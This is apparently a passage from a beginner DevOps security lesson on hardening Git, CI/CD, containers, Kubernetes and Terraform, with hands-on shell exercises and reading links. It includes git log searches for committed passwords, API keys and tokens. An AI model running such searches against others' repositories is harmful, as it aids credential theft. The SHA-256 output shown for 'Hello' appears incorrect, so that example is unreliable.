In [Version Control](/learn/foundations/version-control/), you learned Git and GitHub. Security considerations include:

- **`.gitignore` secrets**: Ensure `.env`, private keys, and credential files are excluded from version control before your first commit.
- **Signed commits**: Use `git commit -S` with a GPG or SSH key to cryptographically sign your commits, proving they came from you. GitHub shows a "Verified" badge on signed commits.
- **Branch protection**: Configure branch protection rules to require reviews and status checks before code is merged to main.
- **Dependency scanning**: Enable [Dependabot](https://docs.github.com/en/code-security/dependabot) to automatically detect and alert on vulnerable dependencies.

### CI/CD

In [CI/CD](/learn/foundations/cicd/), you learned about automated pipelines. Security considerations include:

- **Use the CI/CD platform's secrets management**: Store secrets in GitHub Actions secrets, not in workflow files.
- **Pin action versions**: Use commit SHAs instead of tags for third-party actions to prevent supply chain attacks.
- **Use OIDC for cloud authentication**: Instead of storing long-lived cloud credentials as CI/CD secrets, use OpenID Connect (OIDC) to get short-lived tokens. GitHub Actions supports this for AWS, Azure, and GCP.
- **Review workflow permissions**: Use the `permissions` key in GitHub Actions to grant only the permissions the workflow needs.

```yaml
# Restrict permissions to only what's needed
permissions:
  contents: read
  packages: write
```

### Containers

In [Containers](/learn/foundations/containers/), you learned Docker. Security considerations include:

- **Run as non-root**: Always create and use a non-root user in your Dockerfiles.
- **Use minimal base images**: Images like `alpine` or `distroless` have fewer packages and therefore fewer potential vulnerabilities.
- **Scan images for vulnerabilities**: Tools like `docker scout`, [Trivy](https://aquasecurity.github.io/trivy/), and [Grype](https://github.com/anchore/grype) scan container images for known vulnerabilities.
- **Do not store secrets in images**: Secrets baked into a Docker image persist in every layer and can be extracted. Use runtime environment variables or mounted secrets instead.
- **Pin base image digests**: Use `FROM node:20@sha256:abc123...` instead of `FROM node:20` to ensure you always build from the exact same base image.

### Kubernetes

In [Container Orchestration](/learn/foundations/container-orchestration/), you learned Kubernetes. Security considerations include:

- **RBAC**: Kubernetes has a built-in role-based access control system. Define Roles and ClusterRoles with minimal permissions, and bind them to specific ServiceAccounts.
- **Network Policies**: By default, all pods can communicate with all other pods. Network Policies restrict traffic to only what is necessary.
- **Pod Security Standards**: Kubernetes defines three levels (Privileged, Baseline, Restricted) that control what pods can do. Use the Restricted profile for production workloads.
- **Secrets management**: Kubernetes Secrets are base64-encoded, not encrypted, by default. Use encryption at rest and consider external secrets operators that sync from HashiCorp Vault or cloud secret managers.

### Infrastructure as Code

In [Infrastructure as Code](/learn/foundations/iac/), you learned Terraform and IaC principles. Security considerations include:

- **State file security**: Terraform state files may contain sensitive data (passwords, private keys). Store state in an encrypted remote backend (S3 with encryption, Azure Blob with encryption), never in version control.
- **Least-privilege provider credentials**: The credentials Terraform uses to provision infrastructure should have only the permissions necessary for the resources being managed.
- **Review plans before applying**: Always run `terraform plan` and review the output before `terraform apply`. Automated pipelines should require approval for production changes.
- **Use `sensitive` flags**: Mark variables and outputs as `sensitive` to prevent them from appearing in logs and plan output.

```hcl
variable "database_password" {
  type      = string
  sensitive = true
}
```

---

## Try It: Security Checklist

Work through these hands-on exercises to apply what you have learned. Each one reinforces a concept from the lesson.

> **Try It**: Check the file permissions on your SSH private key. It should be `600` (read/write for owner only). If it is not, SSH clients will refuse to use it.

```bash
ls -la ~/.ssh/id_ed25519
# Expected output: -rw------- 1 youruser yourgroup ... id_ed25519
# The permissions should be 600 (rw for owner, nothing for group and others)

# If permissions are wrong, fix them:
chmod 600 ~/.ssh/id_ed25519
```

> **Try It**: Generate a SHA-256 hash of a string. Notice how any change in input produces a completely different hash.

```bash
echo "hello" | sha256sum
# 5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03

echo "Hello" | sha256sum
# e7816e58b8e91e5e22b99e5a8d2c0e5fdbf9fdff98b3b4f08c2f57b6b1f4f4aa

echo "hello" | sha256sum
# Same hash as the first — hashing is deterministic
```

> **Try It**: Inspect the TLS certificate for github.com. Look at the certificate chain — you should see a leaf certificate for github.com, an intermediate CA, and information about the root CA.

```bash
openssl s_client -connect github.com:443 -brief
# Look for:
# - Subject: the domain the certificate is issued to
# - Issuer: the CA that signed the certificate
# - Verification: OK means the chain is valid
```

> **Try It**: Search your Git history for accidentally committed secrets. Run this in one of your repositories.

```bash
# Search for common secret patterns
git log -S "password" --oneline
git log -S "api_key" --oneline
git log -S "secret" --oneline
git log -S "token" --oneline

# If any results appear, investigate the commits to determine
# if actual secrets were committed
```

> **Try It**: Check your current user identity and group memberships. This tells you what permissions your current session has.

```bash
# Display your user ID, username, group IDs, and group names
id

# Example output:
# uid=1000(youruser) gid=1000(youruser) groups=1000(youruser),27(sudo),999(docker)

# Check who you are
whoami

# List your groups
groups
```

> **Try It**: Verify a downloaded file's checksum. This is how you confirm a file has not been tampered with.

```bash
# Step 1: Download a file (conceptual example)
# curl -LO https://example.com/software-v1.0.tar.gz

# Step 2: Download or note the expected checksum from the official source
# Expected SHA-256: abc123def456...

# Step 3: Compute the hash of your downloaded file
sha256sum software-v1.0.tar.gz

# Step 4: Compare the output to the expected checksum
# If they match, the file is authentic and intact
# If they differ, the file has been modified — do not use it

# Automated verification:
echo "abc123def456...  software-v1.0.tar.gz" | sha256sum --check
# Output: software-v1.0.tar.gz: OK (if the hash matches)
```

---

## Key Takeaways

- **Security is foundational, not optional.** It is part of every role, every system, and every decision you make as an engineer.
- **The CIA triad** — confidentiality, integrity, and availability — is the framework for evaluating security decisions. Every control you implement protects one or more of these pillars.
- **Authentication verifies identity; authorization grants permissions.** Authentication happens first. They are different systems solving different problems.
- **Symmetric encryption** (same key for encrypt/decrypt) is fast and used for bulk data. **Asymmetric encryption** (key pairs) solves the key distribution problem and enables digital signatures. **Hashing** is one-way and used for integrity verification and password storage.
- **TLS certificates** bind public keys to identities. The chain of trust (root CA to intermediate CA to leaf certificate) is how your browser verifies websites. Let's Encrypt made HTTPS free and automated.
- **Never commit secrets to Git.** Use environment variables for delivery, `.env` files (gitignored) for development, CI/CD platform secrets for pipelines, and vault systems for production.
- **Apply least privilege everywhere.** Minimum permissions, scoped to specific resources, with short-lived credentials when possible. This limits the blast radius of any compromise.
- **Know the common attack vectors**: injection, XSS, CSRF, supply chain attacks, and credential stuffing. Understanding how attacks work is the first step to preventing them.
- **Security is embedded in every topic** you learn — shell scripting, version control, CI/CD, containers, Kubernetes, and Infrastructure as Code all have security implications and best practices.
- **Defense in depth**: no single control is sufficient. Layer multiple security measures so that if one fails, others still protect you.

---

## Resources & Further Reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — The ten most critical web application security risks, updated regularly by the Open Web Application Security Project.
- [Let's Encrypt](https://letsencrypt.org/) — Free, automated TLS certificates for any website.
- [HashiCorp Vault Documentation](https://developer.hashicorp.com/vault/docs) — Comprehensive guide to secrets management, encryption as a service, and identity-based access.
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) — A framework for managing and reducing cybersecurity risk, widely adopted across industries.
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks) — Configuration guidelines for securely setting up operating systems, cloud platforms, containers, and more.
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/) — Generate secure TLS configurations for Apache, Nginx, HAProxy, and other web servers.
- [Have I Been Pwned](https://haveibeenpwned.com/) — Check if your email or passwords have appeared in known data breaches.
- [GitHub Security Best Practices](https://docs.github.com/en/code-security) — Guides for securing repositories, managing secrets, scanning for vulnerabilities, and configuring Dependabot.
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — Practical, concise security guidance for specific topics like authentication, session management, input validation, and more.
